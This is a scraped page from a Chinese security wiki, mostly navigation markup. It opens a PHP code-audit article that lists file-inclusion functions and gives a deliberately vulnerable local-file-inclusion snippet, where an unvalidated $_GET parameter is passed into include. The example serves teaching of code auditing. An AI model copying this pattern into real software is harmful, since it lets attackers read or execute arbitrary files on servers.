Attack </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../crypto/hash/complex/ class=md-nav__link> 综合题目 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_8 type=checkbox id=__nav_3_8> <label class=md-nav__link for=__nav_3_8> 数字签名 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=数字签名 data-md-level=2> <label class=md-nav__title for=__nav_3_8> <span class="md-nav__icon md-icon"></span> 数字签名 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../crypto/signature/introduction/ class=md-nav__link> 数字签名 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_8_2 type=checkbox id=__nav_3_8_2> <label class=md-nav__link for=__nav_3_8_2> RSA 数字签名 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="RSA 数字签名" data-md-level=3> <label class=md-nav__title for=__nav_3_8_2> <span class="md-nav__icon md-icon"></span> RSA 数字签名 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../crypto/signature/rsa/ class=md-nav__link> RSA 数字签名 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_8_3 type=checkbox id=__nav_3_8_3> <label class=md-nav__link for=__nav_3_8_3> ElGamal 数字签名 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="ElGamal 数字签名" data-md-level=3> <label class=md-nav__title for=__nav_3_8_3> <span class="md-nav__icon md-icon"></span> ElGamal 数字签名 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../crypto/signature/elgamal/ class=md-nav__link> ElGamal </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_8_4 type=checkbox id=__nav_3_8_4> <label class=md-nav__link for=__nav_3_8_4> DSA 数字签名 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="DSA 数字签名" data-md-level=3> <label class=md-nav__title for=__nav_3_8_4> <span class="md-nav__icon md-icon"></span> DSA 数字签名 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../crypto/signature/dsa/ class=md-nav__link> DSA </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_9 type=checkbox id=__nav_3_9> <label class=md-nav__link for=__nav_3_9> 攻击思想总结 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=攻击思想总结 data-md-level=2> <label class=md-nav__title for=__nav_3_9> <span class="md-nav__icon md-icon"></span> 攻击思想总结 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../crypto/attack-summary/attack-mode/ class=md-nav__link> 简介 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_9_2 type=checkbox id=__nav_3_9_2> <label class=md-nav__link for=__nav_3_9_2> 中间相遇攻击 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=中间相遇攻击 data-md-level=3> <label class=md-nav__title for=__nav_3_9_2> <span class="md-nav__icon md-icon"></span> 中间相遇攻击 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../crypto/attack-summary/meet-in-the-middle/ class=md-nav__link> 中间相遇攻击 - MITM </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_9_3 type=checkbox id=__nav_3_9_3> <label class=md-nav__link for=__nav_3_9_3> 比特攻击 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=比特攻击 data-md-level=3> <label class=md-nav__title for=__nav_3_9_3> <span class="md-nav__icon md-icon"></span> 比特攻击 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../crypto/attack-summary/bit-attack/ class=md-nav__link> 比特攻击 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_10 type=checkbox id=__nav_3_10> <label class=md-nav__link for=__nav_3_10> 证书格式 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=证书格式 data-md-level=2> <label class=md-nav__title for=__nav_3_10> <span class="md-nav__icon md-icon"></span> 证书格式 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../crypto/certificate/introduction/ class=md-nav__link> 证书格式 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4 type=checkbox id=__nav_4> <label class=md-nav__link for=__nav_4> Development <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Development data-md-level=1> <label class=md-nav__title for=__nav_4> <span class="md-nav__icon md-icon"></span> Development </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../development/introduction/ class=md-nav__link> Conflux应用开发入门 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_2 type=checkbox id=__nav_4_2> <label class=md-nav__link for=__nav_4_2> 生态开发激励 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=生态开发激励 data-md-level=2> <label class=md-nav__title for=__nav_4_2> <span class="md-nav__icon md-icon"></span> 生态开发激励 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../development/incentive-guide/ class=md-nav__link> 生态激励指南 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_3 type=checkbox id=__nav_4_3> <label class=md-nav__link for=__nav_4_3> 开发工具及相关资源介绍 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=开发工具及相关资源介绍 data-md-level=2> <label class=md-nav__title for=__nav_4_3> <span class="md-nav__icon md-icon"></span> 开发工具及相关资源介绍 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../development/tools/ class=md-nav__link> 开发工具 </a> </li> <li class=md-nav__item> <a href=../../../development/resources/ class=md-nav__link> 开发资源 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_4 type=checkbox id=__nav_4_4> <label class=md-nav__link for=__nav_4_4> ConfluxScan教程 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=ConfluxScan教程 data-md-level=2> <label class=md-nav__title for=__nav_4_4> <span class="md-nav__icon md-icon"></span> ConfluxScan教程 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../development/apply-contract-fee/ class=md-nav__link> 为合约申请Conflux赞助额度（合约代付） </a> </li> <li class=md-nav__item> <a href=../../../development/address-NFT/ class=md-nav__link> NFT查看器教程 </a> </li> <li class=md-nav__item> <a href=../../../development/register-contract-and-token-display/ class=md-nav__link> 如何在Scan上注册合约和代币展示 </a> </li> <li class=md-nav__item> <a href=../../../development/get-lp-token-address/ class=md-nav__link> 查找LP代币的合约地址 </a> </li> <li class=md-nav__item> <a href=../../../development/internal-transaction/ class=md-nav__link> 交易分析 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4_5 type=checkbox id=__nav_4_5> <label class=md-nav__link for=__nav_4_5> Portal钱包教程 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Portal钱包教程 data-md-level=2> <label class=md-nav__title for=__nav_4_5> <span class="md-nav__icon md-icon"></span> Portal钱包教程 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../development/portal/ class=md-nav__link> Portal安装配置步骤 </a> </li> <li class=md-nav__item> <a href=../../../development/portal-setting/ class=md-nav__link> Portal钱包常用功能解析 </a> </li> <li class=md-nav__item> <a href=../../../development/add-token-to-portal/ class=md-nav__link> 添加CRC20代币到Portal的方法与步骤 </a> </li> <li class=md-nav__item> <a href=../../../development/portal-faucet/ class=md-nav__link> ConfluxPortal切换为测试网领取测试币教程 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_5 type=checkbox id=__nav_5> <label class=md-nav__link for=__nav_5> Ecosystem <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Ecosystem data-md-level=1> <label class=md-nav__title for=__nav_5> <span class="md-nav__icon md-icon"></span> Ecosystem </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../ecosystem/introduction/ class=md-nav__link> 生态介绍 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_5_2 type=checkbox id=__nav_5_2> <label class=md-nav__link for=__nav_5_2> Conflux基础生态教程 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Conflux基础生态教程 data-md-level=2> <label class=md-nav__title for=__nav_5_2> <span class="md-nav__icon md-icon"></span> Conflux基础生态教程 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../ecosystem/wcfx-cfx-exchange/ class=md-nav__link> WCFX与CFX代币互换 </a> </li> <li class=md-nav__item> <a href=../../../ecosystem/governance/ class=md-nav__link> Staking合约的质押与解质押 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_5_3 type=checkbox id=__nav_5_3> <label class=md-nav__link for=__nav_5_3> 常见生态介绍及教程 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=常见生态介绍及教程 data-md-level=2> <label class=md-nav__title for=__nav_5_3> <span class="md-nav__icon md-icon"></span> 常见生态介绍及教程 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../ecosystem/tspace/ class=md-nav__link> Tspace 4.0 NFT平台 </a> </li> <li class=md-nav__item> <a href=../../../ecosystem/nft-box/ class=md-nav__link> NFTBox创新型资产交互平台 </a> </li> <li class=md-nav__item> <a href=../../../ecosystem/shuttleflow/ class=md-nav__link> Shuttleflow跨链工具 </a> </li> <li class=md-nav__item> <a href=../../../ecosystem/moonswap/ class=md-nav__link> moonswap生态 </a> </li> <li class=md-nav__item> <a href=../../../ecosystem/phantom/ class=md-nav__link> Phantom协议 </a> </li> <li class=md-nav__item> <a href=../../../ecosystem/dan/ class=md-nav__link> 炼丹西游 </a> </li> <li class=md-nav__item> <a href=../../../ecosystem/guguo/ class=md-nav__link> 古国序列 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_6 type=checkbox id=__nav_6 checked> <label class=md-nav__link for=__nav_6> Web <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Web data-md-level=1> <label class=md-nav__title for=__nav_6> <span class="md-nav__icon md-icon"></span> Web </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../introduction/ class=md-nav__link> Web 简介 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_6_2 type=checkbox id=__nav_6_2> <label class=md-nav__link for=__nav_6_2> SQL 注入 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="SQL 注入" data-md-level=2> <label class=md-nav__title for=__nav_6_2> <span class="md-nav__icon md-icon"></span> SQL 注入 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../sqli/ class=md-nav__link> SQL 注入 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_6_3 type=checkbox id=__nav_6_3> <label class=md-nav__link for=__nav_6_3> XSS 跨站脚本攻击 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="XSS 跨站脚本攻击" data-md-level=2> <label class=md-nav__title for=__nav_6_3> <span class="md-nav__icon md-icon"></span> XSS 跨站脚本攻击 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../xss/ class=md-nav__link> XSS </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_6_4 type=checkbox id=__nav_6_4> <label class=md-nav__link for=__nav_6_4> CSRF 跨站请求伪造 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="CSRF 跨站请求伪造" data-md-level=2> <label class=md-nav__title for=__nav_6_4> <span class="md-nav__icon md-icon"></span> CSRF 跨站请求伪造 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../csrf/ class=md-nav__link> CSRF </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_6_5 type=checkbox id=__nav_6_5> <label class=md-nav__link for=__nav_6_5> SSRF 服务端请求伪造 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="SSRF 服务端请求伪造" data-md-level=2> <label class=md-nav__title for=__nav_6_5> <span class="md-nav__icon md-icon"></span> SSRF 服务端请求伪造 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../ssrf/ class=md-nav__link> SSRF </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_6_6 type=checkbox id=__nav_6_6 checked> <label class=md-nav__link for=__nav_6_6> PHP 代码审计 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="PHP 代码审计" data-md-level=2> <label class=md-nav__title for=__nav_6_6> <span class="md-nav__icon md-icon"></span> PHP 代码审计 </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--active"> <input class="md-nav__toggle md-toggle" data-md-toggle=toc type=checkbox id=__toc> <label class="md-nav__link md-nav__link--active" for=__toc> PHP 代码审计 <span class="md-nav__icon md-icon"></span> </label> <a href=./ class="md-nav__link md-nav__link--active"> PHP 代码审计 </a> <nav class="md-nav md-nav--secondary" aria-label=目录> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> 目录 </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#_1 class=md-nav__link> 文件包含 </a> <nav class=md-nav aria-label=文件包含> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_2 class=md-nav__link> 本地文件包含 </a> </li> <li class=md-nav__item> <a href=#_3 class=md-nav__link> 远程文件包含 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#_4 class=md-nav__link> 文件上传 </a> <nav class=md-nav aria-label=文件上传> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_5 class=md-nav__link> 绕过上传检查 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#_6 class=md-nav__link> 变量覆盖 </a> <nav class=md-nav aria-label=变量覆盖> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_7 class=md-nav__link> 全局变量覆盖 </a> </li> <li class=md-nav__item> <a href=#extract class=md-nav__link> extract() 变量覆盖 </a> </li> <li class=md-nav__item> <a href=#import_request_variables class=md-nav__link> import_request_variables 变量覆盖 </a> </li> <li class=md-nav__item> <a href=#parse_str class=md-nav__link> parse_str() 变量覆盖 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#_8 class=md-nav__link> 命令执行 </a> <nav class=md-nav aria-label=命令执行> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_9 class=md-nav__link> 直接执行代码 </a> </li> <li class=md-nav__item> <a href=#preg_replace class=md-nav__link> preg_replace() 代码执行 </a> </li> <li class=md-nav__item> <a href=#preg_match class=md-nav__link> preg_match 代码执行 </a> <nav class=md-nav aria-label="preg_match 代码执行"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_get class=md-nav__link> 构造 _GET 读取 </a> </li> <li class=md-nav__item> <a href=#_get_1 class=md-nav__link> 获取 _GET 参数 </a> </li> <li class=md-nav__item> <a href=#_10 class=md-nav__link> 传入参数 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#_11 class=md-nav__link> 动态函数执行 </a> </li> <li class=md-nav__item> <a href=#_12 class=md-nav__link> 反引号命令执行 </a> </li> <li class=md-nav__item> <a href=#curly-syntax class=md-nav__link> Curly Syntax </a> </li> <li class=md-nav__item> <a href=#_13 class=md-nav__link> 回调函数 </a> </li> <li class=md-nav__item> <a href=#_14 class=md-nav__link> 反序列化 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#php_1 class=md-nav__link> PHP 特性 </a> <nav class=md-nav aria-label="PHP 特性"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_15 class=md-nav__link> 数组 </a> </li> <li class=md-nav__item> <a href=#hash class=md-nav__link> 魔法 Hash </a> </li> <li class=md-nav__item> <a href=#_16 class=md-nav__link> 十六进制转换 </a> </li> <li class=md-nav__item> <a href=#_17 class=md-nav__link> 类型转换 </a> </li> <li class=md-nav__item> <a href=#_18 class=md-nav__link> 内置函数的参数的松散性 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#_19 class=md-nav__link> 寻找源代码备份 </a> <nav class=md-nav aria-label=寻找源代码备份> <ul class=md-nav__list> <li class=md-nav__item> <a href=#hg class=md-nav__link> hg 源码泄露 </a> </li> <li class=md-nav__item> <a href=#git class=md-nav__link> Git 源码泄露 </a> </li> <li class=md-nav__item> <a href=#ds_store class=md-nav__link> .DS_Store 文件泄露 </a> </li> <li class=md-nav__item> <a href=#_20 class=md-nav__link> 网站备份文件 </a> </li> <li class=md-nav__item> <a href=#svn class=md-nav__link> SVN 泄露 </a> </li> <li class=md-nav__item> <a href=#web-inf-webxml class=md-nav__link> WEB-INF / web.xml 泄露 </a> </li> <li class=md-nav__item> <a href=#cvs class=md-nav__link> CVS 泄露 </a> </li> <li class=md-nav__item> <a href=#_21 class=md-nav__link> 参考文献 </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_7 type=checkbox id=__nav_7> <label class=md-nav__link for=__nav_7> BlockChain <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=BlockChain data-md-level=1> <label class=md-nav__title for=__nav_7> <span class="md-nav__icon md-icon"></span> BlockChain </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../blockchain/introduction/ class=md-nav__link> BlockChain Security Overview </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_7_2 type=checkbox id=__nav_7_2> <label class=md-nav__link for=__nav_7_2> Ethereum Security <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Ethereum Security" data-md-level=2> <label class=md-nav__title for=__nav_7_2> <span class="md-nav__icon md-icon"></span> Ethereum Security </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../blockchain/ethereum/introduction/ class=md-nav__link> Ethereum Overview </a> </li> <li class=md-nav__item> <a href=../../../blockchain/ethereum/basics/ class=md-nav__link> Ethereum Basics </a> </li> <li class=md-nav__item> <a href=../../../blockchain/ethereum/selector-encoding/ class=md-nav__link> Function Selector and Argument Encoding </a> </li> <li class=md-nav__item> <a href=../../../blockchain/ethereum/storage/ class=md-nav__link> Ethereum Storage </a> </li> <li class=md-nav__item> <a href=../../../blockchain/ethereum/opcodes/ class=md-nav__link> Ethereum Opcodes </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_7_2_6 type=checkbox id=__nav_7_2_6> <label class=md-nav__link for=__nav_7_2_6> Known Attacks <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Known Attacks" data-md-level=3> <label class=md-nav__title for=__nav_7_2_6> <span class="md-nav__icon md-icon"></span> Known Attacks </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../blockchain/ethereum/attacks/introduction/ class=md-nav__link> Introduction </a> </li> <li class=md-nav__item> <a href=../../../blockchain/ethereum/attacks/re-entrancy/ class=md-nav__link> Re-Entrancy </a> </li> <li class=md-nav__item> <a href=../../../blockchain/ethereum/attacks/overflow-underflow/ class=md-nav__link> Integer Overflow and Underflow </a> </li> <li class=md-nav__item> <a href=../../../blockchain/ethereum/attacks/randomness/ class=md-nav__link> Randomness </a> </li> <li class=md-nav__item> <a href=../../../blockchain/ethereum/attacks/airdrop-hunting/ class=md-nav__link> Airdrop Hunting </a> </li> <li class=md-nav__item> <a href=../../../blockchain/ethereum/attacks/shortaddress/ class=md-nav__link> Short Address Attack </a> </li> <li class=md-nav__item> <a href=../../../blockchain/ethereum/attacks/delegatecall/ class=md-nav__link> Delegatecall </a> </li> <li class=md-nav__item> <a href=../../../blockchain/ethereum/attacks/uninitialized-storage-pointer/ class=md-nav__link> Uninitialized Storage Pointer </a> </li> <li class=md-nav__item> <a href=../../../blockchain/ethereum/attacks/arbitrarywrite/ class=md-nav__link> Arbitrary Writing </a> </li> <li class=md-nav__item> <a href=../../../blockchain/ethereum/attacks/create2/ class=md-nav__link> CREATE2 </a> </li> <li class=md-nav__item> <a href=../../../blockchain/ethereum/attacks/jump-oriented-programming/ class=md-nav__link> Jump Oriented Programming </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../blockchain/ethereum/reverse/ class=md-nav__link> Smart Contract Reverse </a> </li> <li class=md-nav__item> <a href=../../../blockchain/ethereum/challenges/ class=md-nav__link> 区块链比赛题目 </a> </li> <li class=md-nav__item> <a href=../../../blockchain/ethereum/resources/ class=md-nav__link> 学习资源 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_7_3 type=checkbox id=__nav_7_3> <label class=md-nav__link for=__nav_7_3> Public Blockchain Security <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Public Blockchain Security" data-md-level=2> <label class=md-nav__title for=__nav_7_3> <span class="md-nav__icon md-icon"></span> Public Blockchain Security </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../blockchain/publicblockchain/introduction/ class=md-nav__link> Public Blockchain Security Overview </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_8 type=checkbox id=__nav_8> <label class=md-nav__link for=__nav_8> NFT <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=NFT data-md-level=1> <label class=md-nav__title for=__nav_8> <span class="md-nav__icon md-icon"></span> NFT </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../nft/introduction/ class=md-nav__link> 初识NFT </a> </li> </ul> </nav> </li> </ul> </nav> </div> </div> </div> <div class="md-sidebar md-sidebar--secondary" data-md-component=sidebar data-md-type=toc> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--secondary" aria-label=目录> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> 目录 </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#_1 class=md-nav__link> 文件包含 </a> <nav class=md-nav aria-label=文件包含> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_2 class=md-nav__link> 本地文件包含 </a> </li> <li class=md-nav__item> <a href=#_3 class=md-nav__link> 远程文件包含 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#_4 class=md-nav__link> 文件上传 </a> <nav class=md-nav aria-label=文件上传> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_5 class=md-nav__link> 绕过上传检查 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#_6 class=md-nav__link> 变量覆盖 </a> <nav class=md-nav aria-label=变量覆盖> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_7 class=md-nav__link> 全局变量覆盖 </a> </li> <li class=md-nav__item> <a href=#extract class=md-nav__link> extract() 变量覆盖 </a> </li> <li class=md-nav__item> <a href=#import_request_variables class=md-nav__link> import_request_variables 变量覆盖 </a> </li> <li class=md-nav__item> <a href=#parse_str class=md-nav__link> parse_str() 变量覆盖 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#_8 class=md-nav__link> 命令执行 </a> <nav class=md-nav aria-label=命令执行> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_9 class=md-nav__link> 直接执行代码 </a> </li> <li class=md-nav__item> <a href=#preg_replace class=md-nav__link> preg_replace() 代码执行 </a> </li> <li class=md-nav__item> <a href=#preg_match class=md-nav__link> preg_match 代码执行 </a> <nav class=md-nav aria-label="preg_match 代码执行"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_get class=md-nav__link> 构造 _GET 读取 </a> </li> <li class=md-nav__item> <a href=#_get_1 class=md-nav__link> 获取 _GET 参数 </a> </li> <li class=md-nav__item> <a href=#_10 class=md-nav__link> 传入参数 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#_11 class=md-nav__link> 动态函数执行 </a> </li> <li class=md-nav__item> <a href=#_12 class=md-nav__link> 反引号命令执行 </a> </li> <li class=md-nav__item> <a href=#curly-syntax class=md-nav__link> Curly Syntax </a> </li> <li class=md-nav__item> <a href=#_13 class=md-nav__link> 回调函数 </a> </li> <li class=md-nav__item> <a href=#_14 class=md-nav__link> 反序列化 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#php_1 class=md-nav__link> PHP 特性 </a> <nav class=md-nav aria-label="PHP 特性"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_15 class=md-nav__link> 数组 </a> </li> <li class=md-nav__item> <a href=#hash class=md-nav__link> 魔法 Hash </a> </li> <li class=md-nav__item> <a href=#_16 class=md-nav__link> 十六进制转换 </a> </li> <li class=md-nav__item> <a href=#_17 class=md-nav__link> 类型转换 </a> </li> <li class=md-nav__item> <a href=#_18 class=md-nav__link> 内置函数的参数的松散性 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#_19 class=md-nav__link> 寻找源代码备份 </a> <nav class=md-nav aria-label=寻找源代码备份> <ul class=md-nav__list> <li class=md-nav__item> <a href=#hg class=md-nav__link> hg 源码泄露 </a> </li> <li class=md-nav__item> <a href=#git class=md-nav__link> Git 源码泄露 </a> </li> <li class=md-nav__item> <a href=#ds_store class=md-nav__link> .DS_Store 文件泄露 </a> </li> <li class=md-nav__item> <a href=#_20 class=md-nav__link> 网站备份文件 </a> </li> <li class=md-nav__item> <a href=#svn class=md-nav__link> SVN 泄露 </a> </li> <li class=md-nav__item> <a href=#web-inf-webxml class=md-nav__link> WEB-INF / web.xml 泄露 </a> </li> <li class=md-nav__item> <a href=#cvs class=md-nav__link> CVS 泄露 </a> </li> <li class=md-nav__item> <a href=#_21 class=md-nav__link> 参考文献 </a> </li> </ul> </nav> </li> </ul> </nav> </div> </div> </div> <div class=md-content data-md-component=content> <article class="md-content__inner md-typeset"> <a href=https://github.com/conflux-wiki/conflux-wiki/blob/master/docs/zh/docs/web/php/php.md title=编辑此页 class="md-content__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg> </a> <h1 id=php>PHP 代码审计<a class=headerlink href=#php title="Permanent link">&para;</a></h1> <h2 id=_1>文件包含<a class=headerlink href=#_1 title="Permanent link">&para;</a></h2> <p>常见的导致文件包含的函数有：</p> <ul> <li>PHP：<code>include()</code>，<code>include_once()</code>，<code>require()</code>，<code>require_once()</code>，<code>fopen()</code>，<code>readfile()</code> 等</li> <li>JSP Servlet：<code>ava.io.File()</code>，<code>java.io.FileReader()</code> 等</li> <li>ASP：<code>includefile</code>，<code>includevirtual</code> 等</li> </ul> <p>当 PHP 包含一个文件时，会将该文件当做 PHP 代码执行，而不会在意文件时什么类型。</p> <h3 id=_2>本地文件包含<a class=headerlink href=#_2 title="Permanent link">&para;</a></h3> <p>本地文件包含，Local File Inclusion，LFI。</p> <div class=highlight><pre><span></span><code><span class=cp>&lt;?php</span>
-<span class=nv>$file</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>];</span>
-<span class=k>if</span> <span class=p>(</span><span class=nb>file_exists</span><span class=p>(</span><span class=s1>&#39;/home/wwwrun/&#39;</span><span class=o>.</span><span class=nv>$file</span><span class=o>.</span><span class=s1>&#39;.php&#39;</span><span class=p>))</span> <span class=p>{</span>
-  <span class=k>include</span> <span class=s1>&#39;/home/wwwrun/&#39;</span><span class=o>.</span><span class=nv>$file</span><span class=o>.</span><span class=s1>&#39;.php&#39;</span><span class=p>;</span>
-<span class=p>}</span>
-<span class=cp>?&gt;</span><span class=x></span>
